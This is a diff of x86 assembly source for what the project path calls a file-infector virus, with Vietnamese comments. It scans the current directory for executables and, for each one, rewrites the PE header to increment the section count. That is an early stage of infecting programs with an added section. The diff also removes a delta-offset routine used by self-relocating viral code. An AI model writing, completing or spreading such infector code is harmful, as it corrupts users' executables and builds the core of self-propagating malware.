@@ -11,7 +11,7 @@ includelib kernel32.lib
 includelib user32.lib
 
 .data
-    path db "C:\Users\LuongTD\Downloads\FileInfectorVirus\test\*.*",0 ;
+    path db 100 dup (0) ;
     handle dd ?
     wfd WIN32_FIND_DATA <>
 	handleFile dd ?
@@ -19,8 +19,14 @@ includelib user32.lib
 	data db 100 dup (0)
 	flagCheckExe db 0
 	virtualAddress dd ?
+	ifanew dd ?
+	sectionNumber dw ?
 .code
 read proc number : dword ; ham doc byte voi so luong byte can doc truyen vao 
+	push 100
+	push offset data 
+	call RtlZeroMemory 
+	
 	push 0
 	push 0
 	push dword ptr [number]
@@ -31,6 +37,17 @@ read proc number : dword ; ham doc byte voi so luong byte can doc truyen vao
 	ret
 
 read endp
+write proc number :dword	
+	push 0 
+	push 0
+	push dword ptr [number]
+	push offset data
+	push dword ptr [handleFile]
+	call WriteFile 
+	
+	ret
+
+write endp
 checkFileExe proc ; ham kiem tra xem co phai la file thuc thi khong
 
 	mov byte ptr [flagCheckExe] , 0 ; rerset lai flag check
@@ -48,7 +65,7 @@ newFileName: ;lay path cu truyen vao path moi
 	inc ecx
 	jmp  newFileName
 endNewfileName: ; lay name file de ghi vao trong path moi
-	sub ecx , 3
+	sub ecx , 1
 	mov ebx , 0
 loop2: 
 	cmp byte ptr [wfd.cFileName + ebx]	, 0
@@ -106,16 +123,22 @@ endProc:
 	ret
 
 checkFileExe endp
-
-ifectorFile proc	
-	;;
-endProcInfectorFile:
-	ret
-
-ifectorFile endp
+;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 main: ; Ham main 
-		
+	push offset path 
+	push 100
+	call GetCurrentDirectory 
+	mov ecx , 0
+newPath:
+	cmp byte ptr [path + ecx] , 0
+	je loopFileInDirectory
+	inc ecx  
+	jmp newPath 
+loopFileInDirectory:
+	mov byte ptr [path + ecx] , "\"
+	mov byte ptr [path + ecx + 1] , "*"
+	;------------------------------------
     push offset wfd
     push offset path
     call FindFirstFileA ; Duyet file dau tien trong thu muc
@@ -134,20 +157,53 @@ loopFile:
 	je nextLoopFile ; neu khong phai file thuc thi thi bo qua khong xu li
 	;;;;;;;;;;
 	;;logic file infector in here
+	;-------------------------------------------------------------------------------------------------------------
+	push 0 
+	push 0
+	push  60 
+	push dword ptr [handleFile]
+	call SetFilePointer 
+	push 4
+	call read  
+	mov eax ,  dword ptr [data]
+	mov dword ptr [ifanew] , eax
+	add eax , 6
+	push 0 
+	push 0
+	push eax
+	push dword ptr [handleFile]
+	call SetFilePointer 
 	
+	push 2 
+	call read 
+	mov ax , word ptr [data]
+	mov word ptr [sectionNumber] , ax
+	inc word ptr [data]
+	push 1
+	push 0
+	push -2
+	push dword ptr [handleFile]
+	call SetFilePointer 
+	push 2
+	call write  
+	;;
+	mov eax ,dword ptr [ifanew]
+	add eax , 248
+	push 0
+	push 0
+	push eax 
+	push dword ptr [handleFile]
+	call SetFilePointer 
 	
-	;;tien hanh su dung ki thuat delta de lay duoc dia chi that su file khi duoc chay tren bo nho  
-	call Delta
-Delta:
-	pop ebp ; Sau khi call thi windows loader se tien hanh day dia chi thuc su cua label Delta vao trong stack
-	; Tuc la ta da lay duoc dia chi that su khi chay trong bo nho cua label Detal nay 
-	;offset se lay duoc gia tri ao tuong doi tinh tu imagesbase 
-	sub ebp , offset Delta ; Tuc la cau lenh nay se lay dia chi that su tren bo nho tru dia dia chi ao tuong doi va tinh duoc dia chi that su cua chuong trinh tren bo nho
-	;; Tai sao lai khong dung imagebase vi no la dia chi windows loader uu tien khi tai len bo nho thoi nhung co the no se tai len dia chi khac khi dia chia uu tien da duoc su dung  
-	mov dword ptr [virtualAddress] , ebp ; Luu lai dung sau 
+	push 2
+	call read
 	
-	
-	call ifectorFile 
+	push 0
+	push 0 
+	push offset data
+	push 0
+	call MessageBox 
+	;-------------------------------------------------------------------------------------------------------------
 	;;end
 	;;;;;;;;;
 nextLoopFile:
